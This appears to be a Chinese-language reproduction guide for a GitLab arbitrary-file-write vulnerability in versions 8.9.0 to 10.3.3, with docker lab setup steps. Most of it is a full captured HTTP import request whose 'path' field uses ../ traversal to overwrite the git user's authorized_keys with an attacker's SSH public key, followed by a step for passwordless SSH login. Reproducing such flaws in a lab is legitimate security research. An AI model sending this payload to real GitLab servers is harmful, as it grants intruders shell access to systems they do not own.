# Gitlab的任意文件写入

影响版本：

GitLab CE and EE 8.9.0 - 9.5.10
GitLab CE and EE 10.0.0 - 10.1.5
GitLab CE and EE 10.2.0 - 10.2.5
GitLab CE and EE 10.3.0 - 10.3.3

[hackerone 漏洞地址](https://hackerone.com/reports/298873)
[先知](https://xz.aliyun.com/t/2366?from=timeline&isappinstalled=0)

## 复现方法
1. docker run -d --name gitlab -p 80:80 -p 443:443 -p 2222:22  gitlab/gitlab-ce:10.2.4-ce.0

2. 修改配置文件
docker exec -it gitlab /bin/bash
nano /etc/gitlab/gitlab.rb

# 去掉gitlab的注释并修改对应ip
external_url '192.168.1.100'
#重新载入配置文件
gitlab-ctl reconfigure
# 访问对应ip，第一次需要设置密码，并新建用户
http://192.168.1.100/

3. 登录gitlab->创建项目->Import project->GitLab Import->选择文件

4. 然后本机的ssh公钥（注意是公钥）

5. 点击import project 后，burp拦住修改path的值为/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys
数据包如下：
POST /import/gitlab_project HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------20787582420424
Content-Length: 1214
Referer: http://192.168.1.100/import/gitlab_project/new?namespace_id=2&path=
Cookie: _gitlab_session=9c5f21dbfe98d90b1d992e1c9907584c; sidebar_collapsed=false
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------20787582420424
Content-Disposition: form-data; name="utf8"

â
-----------------------------20787582420424
Content-Disposition: form-data; name="authenticity_token"

JoWtToPxTJL6RVASaprnR1hRqEGARnbLkA06favQLxQ7Y7YtyqfE9+JsbV/NAwy7XAdTuzgRsxJ/Kl1hH9V6xA==
-----------------------------20787582420424
Content-Disposition: form-data; name="namespace_id"

{:value=>2}
-----------------------------20787582420424
Content-Disposition: form-data; name="path"

ssh/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys
-----------------------------20787582420424
Content-Disposition: form-data; name="namespace_id"

2
-----------------------------20787582420424
Content-Disposition: form-data; name="file"; filename="id_rsa.pub"
Content-Type: application/vnd.ms-publisher

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+McaRvLdnm+u30cACV4ftHJUESNVNV/VNlwm5xST343cFQODjBua5ffpCgDIejiVhyz9BzMmmynN5tnN6JQlx4SwSGkuR3+wzbJ8XKJNHLpOeZ2Xzw+UA9duDinDQHUklFwDmjH7Pywy6kRurIWXTsdupkLrHobEjSjrwEkqvLUnRi1EA/nU5es+kEz6c04jDUrZoGaj5GiI7VYReX+d9Pm524H9KfBpFIZ27yaWs1lR9b+dXjbXnUdysKdWTQcwy1tv+xhEbwF9m/PQajAEPPl95u/qrGPMqT0l08dC6H9o50i9Yn0Yf3t946g4QjGBs+GZgaNoLda8d5U5S8XLz BF@DESKTOP-4UM7GF4

-----------------------------20787582420424--

6. 尝试git用户ssh免密登录